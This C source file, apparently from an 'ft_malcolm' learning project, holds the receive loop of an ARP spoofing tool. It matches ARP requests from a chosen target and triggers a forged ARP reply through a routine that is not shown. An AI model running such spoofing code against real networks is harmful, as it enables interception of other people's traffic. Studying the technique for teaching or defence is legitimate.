#include "ft_malcolm.h"

static int	is_matching_request(const t_arp_packet *pkt, const t_malcolm_ctx *ctx)
{
	if (ntohs(pkt->eth.proto) != ETHERTYPE_ARP)
		return (0);
	if (ntohs(pkt->arp.hrd) != ARPHRD_ETHER || ntohs(pkt->arp.pro) != ETHERTYPE_IP)
		return (0);
	if (pkt->arp.hln != ETH_ALEN || pkt->arp.pln != IP4_ALEN)
		return (0);
	if (ntohs(pkt->arp.op) != ARPOP_REQUEST)
		return (0);
	if (ft_memcmp(pkt->arp.sha, ctx->tgt_mac, ETH_ALEN) != 0)
		return (0);
	if (ft_memcmp(pkt->arp.spa, ctx->tgt_ip, IP4_ALEN) != 0)
		return (0);
	if (ft_memcmp(pkt->arp.tpa, ctx->src_ip, IP4_ALEN) != 0)
		return (0);
	return (1);
}

int	listen_and_spoof(t_malcolm_ctx *ctx)
{
	uint8_t				buffer[2048];
	struct sockaddr_ll	from;
	socklen_t			fromlen;
	ssize_t				bytes;
	t_arp_packet		*pkt;
	char				mac_str[18];
	char				ip_str[INET_ADDRSTRLEN];

	while (g_running)
	{
		fromlen = sizeof(from);
		bytes = recvfrom(ctx->sockfd, buffer, sizeof(buffer), 0,
				(struct sockaddr *)&from, &fromlen);
		if (bytes < 0)
		{
			if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR)
				continue ;
			fprintf(stderr, "ft_malcolm: recvfrom failed: %s\n", strerror(errno));
			return (-1);
		}
		if (bytes < (ssize_t)TOTAL_PACKET_LEN)
			continue ;
		pkt = (t_arp_packet *)buffer;
		if (is_matching_request(pkt, ctx))
		{
			format_mac(pkt->arp.sha, mac_str, sizeof(mac_str));
			format_ip(pkt->arp.spa, ip_str, sizeof(ip_str));
			printf("An ARP request has been broadcast.\n");
			printf("mac address of request: %s\n", mac_str);
			printf("IP address of request: %s\n", ip_str);
			if (ctx->verbose)
				print_packet_verbose(buffer, (size_t)bytes);
			if (send_arp_reply(ctx) != 0)
				return (-1);
			printf("Exiting program...\n");
			return (0);
		}
	}
	printf("\nInterrupted by user. Exiting program...\n");
	return (0);
}
